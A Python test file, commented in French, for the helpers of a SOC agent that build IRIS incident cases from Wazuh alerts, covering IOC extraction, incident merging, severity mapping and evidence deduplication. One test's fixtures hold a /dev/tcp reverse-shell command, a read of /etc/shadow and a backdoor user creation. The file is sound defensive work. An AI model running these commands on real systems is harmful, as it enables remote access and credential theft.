"""Tests des helpers de génération de case IRIS (sans base ni IRIS).

Le formatage des notes et le choix de classification/IOC sont déterministes et
doivent l'être : c'est ce qui atterrit dans le dossier d'incident lu par un
analyste.
"""

import datetime as _dt

from soc_agent import iris
from soc_agent.iris import (
    CLASSIF_RAW,
    CLASSIF_DEFAULT,
    CLASSIF_RANSOMWARE,
    _related,
    _classification,
    _distinct,
    _iocs,
    _note_fp,
    _note_tp,
    _set_note,
    _tag,
    _verdict_changed,
)


class _FakeConn:
    """conn minimal : renvoie des lignes de triages canned pour execute()."""

    def __init__(self, rows):
        self._rows = rows

    def execute(self, *a, **k):
        return self

    def fetchall(self):
        return self._rows


def _tr(**kw):
    """Ligne de traits d'alerte pour le garde-fou anti-doublon."""
    base = {"srcip": None, "srcuser": None, "entity": None,
            "mitre_tactics": [], "rule_groups": []}
    base.update(kw)
    return base


# --- correctif #1 : ne pas régénérer le rapport LLM si le verdict n'a pas bougé

def test_verdict_a_change_stable_ne_regenere_pas():
    """Deux triages identiques (verdict + actions) -> le rapport ressortirait
    à l'identique, on ne régénère pas (False)."""
    rows = [{"verdict": "true_positive", "actions": ["propose_block_ip", "open_case"]},
            {"verdict": "true_positive", "actions": ["propose_block_ip", "open_case"]}]
    assert _verdict_changed(_FakeConn(rows), 1) is False


def test_verdict_a_change_verdict_different_regenere():
    rows = [{"verdict": "true_positive", "actions": ["open_case"]},
            {"verdict": "needs_investigation", "actions": ["open_case"]}]
    assert _verdict_changed(_FakeConn(rows), 1) is True


def test_verdict_a_change_actions_differentes_regenere():
    rows = [{"verdict": "true_positive", "actions": ["propose_isolate_host", "open_case"]},
            {"verdict": "true_positive", "actions": ["open_case"]}]
    assert _verdict_changed(_FakeConn(rows), 1) is True


def test_verdict_a_change_premier_triage_regenere():
    """Un seul triage (première analyse) : on régénère (True)."""
    assert _verdict_changed(_FakeConn([{"verdict": "true_positive",
                                         "actions": ["open_case"]}]), 1) is True


def test_section_commandes_ecarte_bruit_session():
    """Le compte compromis est aussi une session légitime : son bruit de login
    (gpg-agent, générateurs systemd), séparé de l'attaque par un silence, ne
    doit PAS apparaître ; seules les commandes rattachées à l'attaque restent."""
    from datetime import datetime, timedelta, timezone
    from soc_agent.iris import _section_commands
    base = datetime(2026, 7, 25, 14, 0, 0, tzinfo=timezone.utc)

    def al(sec, level, cmd, uid="1001"):
        hexp = cmd.replace(" ", "\x00").encode().hex()
        raw = {"full_log": f"proctitle={hexp}", "data": {"audit": {"uid": uid}}}
        return {"ts": base + timedelta(seconds=sec), "rule_level": level,
                "rule_id": "80792", "rule_desc": "", "rule_groups": [],
                "srcip": None, "srcuser": None, "entity": None, "raw": raw}

    alerts = [
        # Burst d'init de session à t=0..2 (bruit de login sous le même uid).
        al(0, 3, "/bin/bash /usr/lib/systemd/user-environment-generators/90gpg-agent"),
        al(1, 3, "gpgconf --list-options gpg-agent"),
        al(2, 3, "bash -c whoami; id"),
        # Attaque à t=120+ : alerte HIGH (ancre) puis suite immédiate.
        al(120, 12, "timeout 3 bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
        al(124, 3, "sudo cat /etc/shadow"),
        al(130, 3, "sudo useradd -m svcbackup"),
    ]
    sec = _section_commands(alerts)
    # Attaque présente.
    assert "svcbackup" in sec and "/etc/shadow" in sec and "dev/tcp" in sec
    # Bruit écarté : denylist (gpg-agent) ET cluster détaché (whoami, 118 s avant
    # la première alerte malveillante).
    assert "gpg-agent" not in sec
    assert "whoami" not in sec


def test_distincts_uids_compromis_differents():
    # Deux chaînes simultanées sur le même hôte (uid 1001 vs uid 33/www-data) :
    # identités fortes disjointes -> incidents DISTINCTS, jamais à fondre.
    a = [_tr(audit_uid=1001, mitre_tactics=["Execution"])]
    b = [_tr(audit_uid=33, mitre_tactics=["Execution"])]
    assert _distinct(a, b) is True


def test_non_distincts_sans_identite_forte():
    # Beacons reverse-shell : aucun uid/IP fort -> non distincts, donc éligibles
    # à la fusion si apparentés.
    a = [_tr(audit_uid=None, entity="/usr/bin/bash", mitre_tactics=["Execution"])]
    b = [_tr(audit_uid=None, entity="/usr/bin/dash", mitre_tactics=["Execution"])]
    assert _distinct(a, b) is False


def test_root_ne_distingue_pas():
    # uid 0 (privesc SUID) apparaît partout : ne doit pas séparer deux incidents.
    a = [_tr(audit_uid=0, mitre_tactics=["Execution"])]
    b = [_tr(audit_uid=0, mitre_tactics=["Execution"])]
    assert _distinct(a, b) is False


def test_apparentes_par_tactique_mitre():
    # Lien faible (tactique commune) suffit à établir la parenté.
    a = [_tr(entity="/usr/bin/bash", mitre_tactics=["Execution"],
             rule_groups=["threat_hunting", "linux"])]
    b = [_tr(entity="/usr/bin/dash", mitre_tactics=["Execution"],
             rule_groups=["threat_hunting", "linux"])]
    assert _related(a, b) is True


def test_non_apparentes_traits_disjoints():
    a = [_tr(mitre_tactics=["Execution"], rule_groups=["threat_hunting"])]
    b = [_tr(mitre_tactics=["Impact"], rule_groups=["syscheck_file"])]
    assert _related(a, b) is False


def test_entite_generique_ne_lie_pas():
    # bash/dash partagés ne créent PAS de parenté (sinon toute activité shell
    # fusionnerait). Seuls les objets concrets non génériques comptent.
    a = [_tr(entity="/usr/bin/bash")]
    b = [_tr(entity="/usr/bin/bash")]
    assert _related(a, b) is False


class _Rep:
    """Réponse ApiResponse minimale."""

    def __init__(self, data, ok=True):
        self._data = data
        self._ok = ok

    def is_success(self):
        return self._ok

    def get_data(self):
        return self._data


class FakeCase:
    """Client IRIS factice : enregistre les appels au lieu de les émettre."""

    def __init__(self, tags="", dirs=None):
        self._tags = tags
        self._dirs = dirs if dirs is not None else []
        self.updates = []
        self.notes_added = []
        self.notes_updated = []
        self.created_dirs = []

    def get_case(self, case_id):
        return _Rep({"case_tags": self._tags})

    def update_case(self, case_id=None, **kw):
        self.updates.append(kw)
        return _Rep({"case_id": case_id})

    def list_notes_directories(self, cid=None):
        return _Rep(self._dirs)

    def update_note(self, note_id=None, note_content=None, cid=None):
        self.notes_updated.append((note_id, note_content))
        return _Rep({"note_id": note_id})

    def add_notes_directory(self, directory_name=None, cid=None):
        self.created_dirs.append(directory_name)
        return _Rep({"id": 99})

    def add_note(self, note_title=None, note_content=None, directory_id=None, cid=None):
        self.notes_added.append((note_title, directory_id, note_content))
        return _Rep({"note_id": 1})

TRIAGE_FP = {"verdict": "false_positive", "confidence": "high",
             "reason": "Fichier de test EICAR déposé par l'équipe.",
             "mitre": None, "actions": []}


def test_note_fp_avec_exception():
    rule = {"match_all": {"rule_id": "87105", "file": "/tmp/eicar.com"},
             "reason": "FP récurrent", "source": "auto", "active": True}
    note = _note_fp(TRIAGE_FP, rule)
    assert "Faux positif" in note
    assert "EICAR" in note
    assert "active" in note
    assert "/tmp/eicar.com" in note          # l'exception est explicitée


def test_note_fp_sans_exception():
    note = _note_fp(TRIAGE_FP, None)
    assert "Pas encore d'exception" in note


def test_classification_ransomware():
    inc = {"mitre_tactics": ["Impact"]}
    alerts = [{"rule_groups": ["ransomware", "linux"]}]
    assert _classification(inc, alerts) == CLASSIF_RANSOMWARE


def test_classification_brute_force():
    inc = {"mitre_tactics": []}
    alerts = [{"rule_groups": ["authentication_failed"]}]
    assert _classification(inc, alerts) == CLASSIF_RAW


def test_classification_defaut():
    assert _classification({"mitre_tactics": []}, [{"rule_groups": ["ossec"]}]) \
        == CLASSIF_DEFAULT


def test_iocs_dedupliques_et_types():
    import json
    vt = {"found": "62", "malicious": "48", "source": {"sha256": "abc",
                                                       "file": "/tmp/x"}}
    alerts = [
        {"srcip": "45.134.26.87", "entity": "/tmp/x",
         "raw": json.dumps({"data": {"virustotal": vt}})},
        {"srcip": "45.134.26.87", "entity": "/tmp/x",   # doublon
         "raw": json.dumps({"data": {}})},
    ]
    iocs = _iocs(alerts)
    values = {v for v, _, _ in iocs}
    types = {t for _, t, _ in iocs}
    # Dédupliqué : l'IP et le chemin n'apparaissent qu'une fois malgré deux
    # alertes ; le fichier signalé par VT est porté par son hash.
    assert values == {"45.134.26.87", "/tmp/x", "abc"}
    assert "ip-any" in types and "sha256" in types


def test_iocs_ignore_verdict_vt_non_malveillant():
    """Un hash que VirusTotal ne connaît même pas n'est pas un indicateur de
    compromission. Observé à un exercice purple-team : deux des trois IOC d'un
    case étaient des `found=0, malicious=0` étiquetés « signalé par VirusTotal »."""
    import json
    raw = json.dumps({"data": {"virustotal": {
        "found": "0", "malicious": "0",
        "source": {"sha1": "3f35b3515a5aeff3998b084846c4d37aa0fb9233",
                   "file": "C:\\\\Temp\\\\x.exe"}}}})
    assert _iocs([{"srcip": None, "entity": None, "raw": raw}]) == []


def test_iocs_ignore_les_cles_de_registre():
    """L'intégration VT suit aussi le FIM du registre : une clé n'a pas de
    contenu analysable, et le hash qui l'accompagne ne désigne aucun binaire."""
    import json
    raw = json.dumps({"data": {"virustotal": {
        "found": "5", "malicious": "3",
        "source": {"sha1": "deadbeef",
                   "file": "HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet"
                           "\\\\Services\\\\bam\\\\State"}}}})
    assert _iocs([{"srcip": None, "entity": None, "raw": raw}]) == []


def test_iocs_capte_lexecutable_windows_depose():
    """mimikatz.exe manquait aux IOC d'un case alors qu'il était cité par une
    dizaine d'alertes — et son absence empêchait aussi la fusion de campagne
    entre les deux hôtes qui l'exécutaient."""
    import json
    path = r"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\mimikatz\\x64\\mimikatz.exe"
    raw = json.dumps({"data": {"win": {"system": {"eventID": "1"},
                                       "eventdata": {"image": path}}}})
    values = {v for v, _, _ in _iocs([{"srcip": None, "entity": None,
                                        "raw": raw}])}
    assert values == {path.replace("\\\\", "\\")}


def _alert_auditd(execve: dict, proctitle: str = "", exe: str = "/usr/bin/sh",
                   file: str | None = None) -> dict:
    """Alerte auditd telle que la stocke l'ingest : le champ `entity` et
    `audit.file.name` portent le binaire chargé, jamais l'argument."""
    import json
    full_log = ""
    if proctitle:
        full_log = "type=PROCTITLE proctitle=" + proctitle.encode().hex()
    data = {"audit": {"execve": execve, "exe": exe,
                      "file": {"name": file or exe}}}
    return {"srcip": None, "entity": exe,
            "raw": json.dumps({"data": data, "full_log": full_log})}


def test_iocs_capte_le_fichier_cite_en_argument():
    """`insmod /tmp/ironveil.ko` et `python3 /tmp/.cache-update.py` ne
    produisaient aucun IOC : auditd met le binaire chargé par le noyau dans
    `audit.exe`/`entity` (/usr/bin/kmod, /usr/bin/python3) et l'artefact déposé
    reste dans l'argv. Case #207 du 2026-08-11, rootkit non indexé."""
    alerts = [
        _alert_auditd({"a0": "insmod", "a1": "/tmp/ironveil.ko"},
                       exe="/usr/bin/kmod", file="/etc/hosts"),
        _alert_auditd({"a0": "python3", "a1": "/tmp/.cache-update.py",
                        "a2": "--id"}, exe="/usr/bin/python3"),
    ]
    values = {v for v, _, _ in _iocs(alerts)}
    assert values == {"/tmp/ironveil.ko", "/tmp/.cache-update.py"}
    assert all(t == "filename" for _, t, _ in _iocs(alerts))


def test_iocs_argv_replie_sur_le_proctitle():
    """Sans champ `execve` décodé, le proctitle hex reste la seule source."""
    alerts = [_alert_auditd({}, proctitle="insmod /dev/shm/.k.ko",
                              exe="/usr/bin/kmod")]
    assert {v for v, _, _ in _iocs(alerts)} == {"/dev/shm/.k.ko"}


def test_iocs_argv_ignore_les_chemins_systeme_et_la_machinerie_tmp():
    """Un argument légitime n'est pas un IOC : ni les binaires/config système,
    ni les montages privés systemd et sockets X11, qui vivent dans /tmp sans
    rien devoir à l'attaquant."""
    alerts = [
        _alert_auditd({"a0": "cat", "a1": "/etc/passwd"}, exe="/usr/bin/cat"),
        _alert_auditd({"a0": "systemd-tmpfiles", "a1": "--clean",
                        "a2": "/tmp/systemd-private-abc/tmp"},
                       exe="/usr/bin/systemd-tmpfiles"),
        _alert_auditd({"a0": "ls", "a1": "/tmp/.X11-unix"}, exe="/usr/bin/ls"),
    ]
    assert _iocs(alerts) == []


def test_iocs_argv_dedup_avec_le_chemin_deja_vu():
    """Le même fichier vu par l'argv et par le FIM sans hash ne fait qu'un IOC."""
    import json
    argv = _alert_auditd({"a0": "python3", "a1": "/tmp/.implant.py"},
                          exe="/usr/bin/python3")
    fim = {"srcip": None, "entity": None,
           "raw": json.dumps({"syscheck": {"path": "/tmp/.implant.py"}})}
    assert len(_iocs([argv, fim])) == 1


def test_iocs_argv_laisse_passer_le_hash_du_meme_fichier():
    """Le chemin vu dans l'argv ne doit pas masquer le HASH du même fichier
    publié ensuite par le FIM : le hash survit au renommage et vaut sur tout le
    parc, c'est la valeur la plus utile des deux."""
    import json
    argv = _alert_auditd({"a0": "python3", "a1": "/tmp/.implant.py"},
                          exe="/usr/bin/python3")
    fim = {"srcip": None, "entity": None,
           "raw": json.dumps({"syscheck": {"path": "/tmp/.implant.py",
                                           "sha256_after": "cafe1234"}})}
    values = {v for v, _, _ in _iocs([argv, fim])}
    assert values == {"/tmp/.implant.py", "cafe1234"}


def test_iocs_ecarte_l_infrastructure_du_soc():
    """L'IP du manager Wazuh n'est jamais un IOC. Le SIEM parle à tout le parc
    (active-responses, keepalives), donc son IP tombe en `srcip` et en cible de
    connexion sur des alertes normales. Case #207 : elle y figurait en « cible
    interne — connexion /dev/tcp », à côté du vrai rootkit."""
    import json
    from soc_agent import config
    from soc_agent.iris import _ip_ioc_valid

    siem = next(iter(config.SOC_INFRA_IPS), None) or "192.168.3.5"
    old = set(config.SOC_INFRA_IPS)
    config.SOC_INFRA_IPS = old | {siem}
    try:
        assert not _ip_ioc_valid(siem)
        alerts = [
            {"srcip": siem, "entity": None, "raw": json.dumps({"data": {}})},
            {"srcip": None, "entity": None,
             "raw": json.dumps({"full_log": f"bash -c /dev/tcp/{siem}/4444",
                                "data": {}})},
        ]
        assert _iocs(alerts) == []
        # Une IP quelconque du même parc reste, elle, un IOC de contexte.
        other = [{"srcip": "192.168.5.99", "entity": None,
                  "raw": json.dumps({"data": {}})}]
        assert {v for v, _, _ in _iocs(other)} == {"192.168.5.99"}
    finally:
        config.SOC_INFRA_IPS = old


def test_soc_infra_ips_deduit_des_url_configurees():
    """L'IP du SOC se déduit des URL déjà déclarées : rien à maintenir en
    double. Un nom DNS est ignoré — la comparaison se fait sur une IP."""
    from soc_agent.config import _host_url

    assert _host_url("https://192.168.3.5:55000") == "192.168.3.5"
    assert _host_url("https://wazuh.lab:9200") is None
    assert _host_url("") is None


def test_iocs_epargne_les_binaires_systeme_et_sondes():
    import json

    def alert(image):
        return {"srcip": None, "entity": None,
                "raw": json.dumps({"data": {"win": {
                    "system": {"eventID": "1"},
                    "eventdata": {"image": image}}}})}

    assert _iocs([alert(r"C:\\Windows\\System32\\cmd.exe")]) == []
    assert _iocs([alert(r"C:\\Users\\a\\AppData\\Local\\Temp"
                         r"\\__PSScriptPolicyTest_ab.cd.ps1")]) == []


def test_taguer_ajoute_hostname():
    """Le hostname de la machine touchée devient un tag du case."""
    c = FakeCase(tags="")
    _tag(c, 5, "endpoint-01")
    assert c.updates == [{"case_tags": ["endpoint-01"]}]


def test_taguer_union_sans_ecraser_ni_dupliquer():
    """On complète les tags existants ; un hostname déjà présent ne rejoue rien."""
    c = FakeCase(tags="prod, endpoint-01")
    _tag(c, 5, "endpoint-01")            # déjà présent
    assert c.updates == []
    c2 = FakeCase(tags="prod")
    _tag(c2, 5, "endpoint-01")
    assert c2.updates == [{"case_tags": ["endpoint-01", "prod"]}]


def test_poser_note_met_a_jour_l_existante():
    """Au refresh, la note d'analyse est REMPLACÉE, pas empilée en double."""
    dirs = [{"id": 3, "name": "Analyse IA",
             "notes": [{"id": 7, "title": "Rapport d'analyse"}]}]
    c = FakeCase(dirs=dirs)
    _set_note(c, 5, "Rapport d'analyse", "nouveau contenu")
    assert c.notes_updated == [(7, "nouveau contenu")]
    assert c.notes_added == []


def test_poser_note_cree_si_absente():
    c = FakeCase(dirs=[])
    _set_note(c, 5, "Rapport d'analyse", "contenu")
    assert c.created_dirs == ["Analyse IA"]
    assert c.notes_added and c.notes_added[0][0] == "Rapport d'analyse"


def test_note_tp_fallback_sans_llm(monkeypatch):
    """Si le LLM est injoignable, le case se crée avec la justification du triage."""
    import soc_agent.iris as iris

    def boom(*a, **k):
        raise RuntimeError("LLM down")

    monkeypatch.setattr(iris, "completion", boom)
    # La map d'anonymisation n'a pas besoin de base pour ce test.
    monkeypatch.setattr(iris, "load_map", lambda *a, **k: {})
    monkeypatch.setattr(iris, "save_map", lambda *a, **k: None)

    # Conn factice : seule _section_remediations l'interroge (table mitigations).
    class _Cur:
        def fetchall(self):
            return []

    class _Conn:
        def execute(self, *a, **k):
            return _Cur()

    conn = _Conn()
    triage = {"verdict": "true_positive", "confidence": "high", "mitre": "T1486",
              "reason": "Ransomware confirmé.",
              "actions": ["propose_isolate_host", "open_case"]}
    inc = {"id": 1, "agent_name": "endpoint-01", "agent_id": "001",
           "first_seen": __import__("datetime").datetime(2026, 7, 22),
           "last_seen": __import__("datetime").datetime(2026, 7, 22),
           "alert_count": 3, "max_level": 15, "mitre_tactics": ["Impact"]}
    note = _note_tp(conn, inc, triage, [{"rule_id": "100670", "rule_level": 15,
                                         "ts": __import__("datetime").datetime(2026, 7, 22),
                                         "rule_desc": "canari", "rule_groups": ["ransomware"],
                                         "srcip": None, "srcuser": None,
                                         "entity": "/root/c.docx", "raw": "{}"}])
    assert "Ransomware confirmé" in note           # justification du triage en repli
    assert "Isoler l'hôte" in note                  # action décidée listée


# --- Sévérité du case IRIS ---------------------------------------------------

def test_severite_iris_suit_la_severite_effective():
    # Niveau 12 (seuil d'ouverture d'incident) sur un asset ordinaire.
    assert iris.severity_name(12) == iris.SEV_HIGH
    # Le même niveau 12 sur un P1 : sévérité effective 14, toujours High.
    assert iris.severity_name(14) == iris.SEV_HIGH
    # Niveau 13 sur un P1 : 15, attaque avérée sur un asset qui compte.
    assert iris.severity_name(15) == iris.SEV_CRITICAL
    # Niveau 12 sur un poste de laboratoire : 11.
    assert iris.severity_name(11) == iris.SEV_MEDIUM


def test_severite_iris_plancher_ueba():
    # max_level bas PAR CONSTRUCTION : le barème dirait « Low », alors que
    # l'incident n'existe que parce qu'un écart statistique l'a justifié.
    assert iris.severity_name(5) == iris.SEV_LOW
    assert iris.severity_name(5, ueba=True) == iris.SEV_MEDIUM
    # Le plancher ne RABAISSE jamais un incident UEBA déjà élevé.
    assert iris.severity_name(15, ueba=True) == iris.SEV_CRITICAL


def test_severite_iris_plafond_faux_positif():
    assert iris.severity_name(14, verdict="false_positive",
                             actions=["close_false_positive"]) == iris.SEV_LOW


def test_severite_iris_pas_de_plafond_si_le_garde_fou_a_refuse():
    # Clôture refusée (niveau trop haut, ou motif d'injection) : le verdict du
    # modèle est précisément ce qu'on ne croit pas. Rétrograder la sévérité
    # appliquerait quand même la décision qu'on vient de refuser.
    assert iris.severity_name(
        14, verdict="false_positive",
        actions=["escalate_human", "open_case"]) == iris.SEV_HIGH


def test_severite_iris_correspondance_par_nom_pas_par_id():
    # Les ids IRIS ne suivent pas l'ordre de gravité (1=Medium, 3=Informational,
    # 4=Low) : une correspondance écrite sur les ids serait fausse.
    ids = iris._SEVERITIES_FALLBACK
    assert ids["medium"] < ids["informational"] < ids["low"] < ids["high"]


def test_description_porte_la_priorite_a_la_mise_a_jour():
    inc = {"id": 7, "alert_count": 3, "max_level": 12, "priority": 1,
           "asset_role": "dc", "severity": 14}
    for update in (False, True):
        d = iris._description(inc, "true_positive", update=update)
        assert "asset P1 (dc)" in d and "14/15" in d


class _FakeSession:
    """Capture l'appel HTTP au lieu de le faire."""

    def __init__(self):
        self.calls = []

    def pi_get(self, uri):
        class R:
            @staticmethod
            def get_data():
                return [{"severity_id": 5, "severity_name": "High"},
                        {"severity_id": 1, "severity_name": "Medium"}]
        return R()

    def pi_post(self, uri, data=None, **kw):
        self.calls.append((uri, data))

        class R:
            @staticmethod
            def is_success():
                return True
        return R()


class _FakeCase:
    def __init__(self):
        self._s = _FakeSession()


def test_severite_posee_avec_le_bon_champ(monkeypatch):
    # `case_severity_id` est ACCEPTÉ par IRIS, répond « updated » et ne change
    # rien : seul `severity_id` écrit réellement. Aucun endpoint ne relit la
    # valeur, donc rien d'autre que ce test ne rattraperait la régression.
    monkeypatch.setattr(iris, "_SEVERITIES_ID", None)
    c = _FakeCase()
    name = iris._set_severity(
        c, 42, {"severity": 14, "max_level": 12}, {"verdict": "true_positive"})
    assert name == iris.SEV_HIGH
    uri, data = c._s.calls[0]
    assert uri == "/manage/cases/update/42"
    assert data == {"severity_id": 5}


# --- boucle de duplication des pièces Evidence (incident du 2026-08-14) -------
#
# 2 987 572 lignes dans `case_received_file` pour 217 542 pièces distinctes.
# La cause : l'idempotence était demandée à IRIS (`list_evidences`), dont
# l'échec était avalé — la liste des « déjà posées » retombait à vide et tout
# l'incident était reposé à chaque cycle. Le repère est désormais local.

_TS = _dt.datetime(2026, 8, 14, 9, 30, tzinfo=_dt.timezone.utc)


class _EvidencesConn:
    """conn minimal portant réellement la table `iris_evidences` en mémoire."""

    def __init__(self):
        self.placed: set[tuple[int, str]] = set()
        self._result: list[dict] = []

    def execute(self, sql, params=None):
        params = params or ()
        if "SELECT alert_id FROM iris_evidences" in sql:
            self._result = [{"alert_id": a} for (i, a) in self.placed
                              if i == params[0]]
        elif "INSERT INTO iris_evidences" in sql:
            key = (params[0], params[1])
            if key in self.placed:
                self._result = []          # ON CONFLICT DO NOTHING
            else:
                self.placed.add(key)
                self._result = [{"alert_id": params[1]}]
        elif "DELETE FROM iris_evidences" in sql:
            self.placed.discard((params[0], params[1]))
            self._result = []
        return self

    def fetchall(self):
        return self._result

    def fetchone(self):
        return self._result[0] if self._result else None


class _EvidencesCase:
    """Client IRIS factice : compte les pièces réellement envoyées."""

    def __init__(self, failed_on=()):
        self.sent: list[str] = []
        self._failed_on = set(failed_on)

    def add_evidence(self, filename=None, **kw):
        if filename in self._failed_on:
            raise RuntimeError("IRIS indisponible")
        self.sent.append(filename)
        return _Rep({"evidence_id": len(self.sent)})


def _alert_ev(aid, ts):
    return {"id": aid, "ts": ts, "rule_id": 80730, "rule_level": 3,
            "rule_desc": "Auditd: SELinux permission check",
            "raw": {"full_log": "log brut"}}


def test_evidences_ne_repose_pas_les_memes_pieces(monkeypatch):
    """Deux passages sur le même incident : la 2e fois, rien n'est renvoyé.

    C'est la régression qui a produit 54 copies du même fichier : chaque cycle
    de 5 minutes reposait l'intégralité des alertes de l'incident.
    """
    monkeypatch.setattr(iris, "_link_wazuh_alert", lambda *a, **k: "http://x")
    conn, case = _EvidencesConn(), _EvidencesCase()
    alerts = [_alert_ev(f"17862515{i:02d}.1583", _TS) for i in range(5)]

    assert iris._evidences(conn, case, 196, 2555, alerts, "003") == 5
    assert iris._evidences(conn, case, 196, 2555, alerts, "003") == 0
    assert len(case.sent) == 5


def test_evidences_plafonnees_par_case(monkeypatch):
    """Au-delà du plafond, on n'archive plus : un onglet Evidence à 100 k
    pièces n'est lisible par personne et fait gonfler la base IRIS."""
    monkeypatch.setattr(iris, "_link_wazuh_alert", lambda *a, **k: "http://x")
    monkeypatch.setattr(iris.config, "EVIDENCE_MAX_PER_CASE", 3)
    conn, case = _EvidencesConn(), _EvidencesCase()
    alerts = [_alert_ev(f"17862515{i:02d}.1583", _TS) for i in range(10)]

    assert iris._evidences(conn, case, 196, 2555, alerts, "003") == 3
    assert len(case.sent) == 3


def test_evidence_en_echec_est_retentee(monkeypatch):
    """Un échec IRIS retire le repère : la pièce repart au passage suivant.

    Poser le repère sans jamais le retirer perdrait la preuve en silence ; ne
    le poser qu'après l'appel ferait boucler dès que l'écriture échoue.
    """
    monkeypatch.setattr(iris, "_link_wazuh_alert", lambda *a, **k: "http://x")
    conn = _EvidencesConn()
    alerts = [_alert_ev("1786251501.1583", _TS)]
    name = ("wazuh 1786251501.1583 r80730 L3 "
           "Auditd: SELinux permission check.json")

    assert iris._evidences(conn, _EvidencesCase(failed_on=[name]), 196, 2555,
                           alerts, "003") == 0
    assert conn.placed == set()          # repère retiré, pièce non perdue

    case = _EvidencesCase()
    assert iris._evidences(conn, case, 196, 2555, alerts, "003") == 1
    assert case.sent == [name]
